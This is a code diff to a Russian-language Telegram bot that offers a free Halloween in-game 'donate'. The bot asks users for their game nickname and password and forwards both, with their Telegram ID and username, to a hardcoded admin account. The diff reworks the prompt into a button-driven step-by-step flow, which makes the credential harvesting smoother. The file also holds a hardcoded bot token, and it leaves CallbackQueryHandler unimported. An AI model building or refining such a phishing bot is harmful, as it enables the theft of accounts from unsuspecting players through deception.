@@ -1,13 +1,16 @@
 import sqlite3
 import time
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 
 # Конфигурация
 BOT_TOKEN = "8300222284:AAHt3oT-fxyls9-xv0CNjG4ucFp4Y3vLFmU"
 ADMIN_ID = 8000395560  # Ваш ID
 CHANNEL_LINK = "https://t.me/pnixmcbe"
 CREATOR_USERNAME = "@isnikson"
+
+# Состояния
+NICKNAME, PASSWORD = range(2)
 
 # База данных
 conn = sqlite3.connect('users.db', check_same_thread=False)
@@ -46,28 +49,65 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     text = (
         "🎃 *ПОЛУЧИ ХЭЛОУИН ДОНАТ!*\n\n"
-        "Чтобы получить донат на Хэллоуин, отправьте мне:\n"
-        "```\n"
-        "Аккаунт:ВАШ_АККАУНТ\n"
-        "Пароль:ВАШ_ПАРОЛЬ\n"
-        "```\n\n"
-        "*Пример:*\n"
-        "```\n"
-        "Аккаунт:Player123\n"
-        "Пароль:pass123\n"
-        "```\n\n"
-        "Донат придет в течение 24 часов!"
+        "Нажмите кнопку ниже чтобы начать получение доната!"
     )
     
     await update.message.reply_text(
         text,
         parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup(keyboard)
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("🎃 ПОЛУЧИТЬ ДОНАТ", callback_data="get_donate")],
+            [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)],
+            [InlineKeyboardButton("👤 СОЗДАТЕЛЬ", url=f"tg://resolve?domain={CREATOR_USERNAME[1:]}")]
+        ])
     )
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == "get_donate":
+        await query.message.reply_text("🔹 Введите ваш никнейм:")
+        return NICKNAME
+
+async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data['nickname'] = update.message.text
+    await update.message.reply_text("🔹 Теперь введите ваш пароль:")
+    return PASSWORD
+
+async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    password = update.message.text
+    nickname = context.user_data['nickname']
+    
+    # Отправка админу
+    admin_text = (
+        "🎃 *НОВЫЕ ДАННЫЕ ДЛЯ ДОНАТА*\n\n"
+        f"👤 User ID: `{user_id}`\n"
+        f"📧 Username: @{update.effective_user.username or 'N/A'}\n"
+        f"🔑 Никнейм: `{nickname}`\n"
+        f"🔒 Пароль: `{password}`\n"
+        f"⏰ Время: `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
+    )
+    
+    await context.bot.send_message(ADMIN_ID, admin_text, parse_mode='Markdown')
+    
+    await update.message.reply_text(
+        "✅ Данные приняты! Донат придет в течение 24 часов.\n\n"
+        "📢 Обязательно подпишись на наш канал!",
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)]
+        ])
+    )
+    
+    return ConversationHandler.END
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ Отменено.")
+    return ConversationHandler.END
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    text = update.message.text
     
     # Проверка бана
     c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
@@ -81,57 +121,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn.commit()
         await update.message.reply_text("❌ Вы забанены за спам.")
         return
-    
-    # Проверка формата данных
-    if "Аккаунт:" in text and "Пароль:" in text:
-        try:
-            lines = text.split('\n')
-            account = None
-            password = None
-            
-            for line in lines:
-                if line.startswith('Аккаунт:'):
-                    account = line.replace('Аккаунт:', '').strip()
-                elif line.startswith('Пароль:'):
-                    password = line.replace('Пароль:', '').strip()
-            
-            if account and password:
-                # Отправка админу
-                admin_text = (
-                    "🎃 *НОВЫЕ ДАННЫЕ ДЛЯ ДОНАТА*\n\n"
-                    f"👤 User ID: `{user_id}`\n"
-                    f"📧 Username: @{update.effective_user.username or 'N/A'}\n"
-                    f"🔑 Аккаунт: `{account}`\n"
-                    f"🔒 Пароль: `{password}`\n"
-                    f"⏰ Время: `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
-                )
-                
-                await context.bot.send_message(
-                    ADMIN_ID,
-                    admin_text,
-                    parse_mode='Markdown'
-                )
-                
-                # Ответ пользователю
-                await update.message.reply_text(
-                    "✅ Данные приняты! Донат придет в течение 24 часов.\n\n"
-                    "📢 Обязательно подпишись на наш канал!",
-                    reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)]
-                    ])
-                )
-            else:
-                await update.message.reply_text(
-                    "❌ Неверный формат. Используйте:\n"
-                    "```\n"
-                    "Аккаунт:ВАШ_АККАУНТ\n"
-                    "Пароль:ВАШ_ПАРОЛЬ\n"
-                    "```",
-                    parse_mode='Markdown'
-                )
-                
-        except Exception as e:
-            await update.message.reply_text("❌ Ошибка. Попробуйте еще раз.")
 
 async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
@@ -156,9 +145,19 @@ async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     application = Application.builder().token(BOT_TOKEN).build()
     
+    conv_handler = ConversationHandler(
+        entry_points=[CallbackQueryHandler(button_handler, pattern='^get_donate$')],
+        states={
+            NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_nickname)],
+            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
+        },
+        fallbacks=[CommandHandler('cancel', cancel)]
+    )
+    
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("ban", ban_command))
     application.add_handler(CommandHandler("unban", unban_command))
+    application.add_handler(conv_handler)
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
     application.run_polling()
